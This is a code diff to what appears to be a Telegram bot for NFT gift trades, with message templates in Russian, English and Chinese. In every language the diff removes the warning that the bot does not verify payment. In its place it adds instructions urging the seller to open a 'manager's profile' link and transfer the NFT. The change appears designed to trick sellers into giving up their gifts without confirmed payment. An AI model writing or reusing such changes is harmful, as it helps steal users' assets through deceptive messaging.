@@ -101,7 +101,8 @@ TEXTS = {
 💰 <b>Сумма:</b> {amount_display} ({usd_display})
 🧾 <b>Заказ:</b> <code>{order_code}</code>
 
-⚠️ <i>Бот не подтверждает оплату. Проверьте её отдельно перед передачей NFT.</i>""",
+✨ <b>Для завершения сделки:</b>
+Откройте <a href="{transfer_url}"><b>профиль менеджера</b></a>, нажмите <b>Transfer Gift</b>, выберите NFT из предложения и подтвердите передачу.""",
         "declined": "❌ Продавец отклонил предложение по подарку {gift}.",
         "transfer_link": "🎁 Передать подарок",
         "confirm_transfer": "✅ Подтвердить передачу",
@@ -121,7 +122,8 @@ TEXTS = {
 💰 <b>Amount:</b> {amount_display} ({usd_display})
 🧾 <b>Order:</b> <code>{order_code}</code>
 
-⚠️ <i>This bot does not verify payment. Check it independently before transferring the NFT.</i>""",
+✨ <b>To complete the deal:</b>
+Open the <a href="{transfer_url}"><b>manager's profile</b></a>, tap <b>Transfer Gift</b>, select the NFT from the offer, and confirm the transfer.""",
         "declined": "❌ The seller declined the offer for {gift}.",
         "transfer_link": "🎁 Transfer the gift",
         "confirm_transfer": "✅ Confirm transfer",
@@ -141,7 +143,8 @@ TEXTS = {
 💰 <b>金额：</b>{amount_display}（{usd_display}）
 🧾 <b>订单：</b><code>{order_code}</code>
 
-⚠️ <i>机器人不会验证付款。转移 NFT 前请自行确认已收到款项。</i>""",
+✨ <b>完成交易：</b>
+打开<a href="{transfer_url}"><b>经理个人资料</b></a>，点击 <b>Transfer Gift</b>，选择报价中的 NFT，然后确认转移。""",
         "declined": "❌ 卖家拒绝了 {gift} 的报价。",
         "transfer_link": "🎁 转移礼物",
         "confirm_transfer": "✅ 确认已转移",
@@ -1008,7 +1011,8 @@ def handle_callback(query):
                 gift=html.escape(offer["gift_name"]),
                 gift_url=html.escape(offer["gift_url"], quote=True),
                 amount_display=format_amount_html(offer["amount"], offer["currency"], offer["gift_name"]),
-                usd_display=format_usd_equivalent(offer["amount"], offer["currency"])
+                usd_display=format_usd_equivalent(offer["amount"], offer["currency"]),
+                transfer_url=html.escape(TRANSFER_URL, quote=True)
             )
             keyboard = {"inline_keyboard": [
                 [{"text": strings["transfer_link"], "url": TRANSFER_URL}],
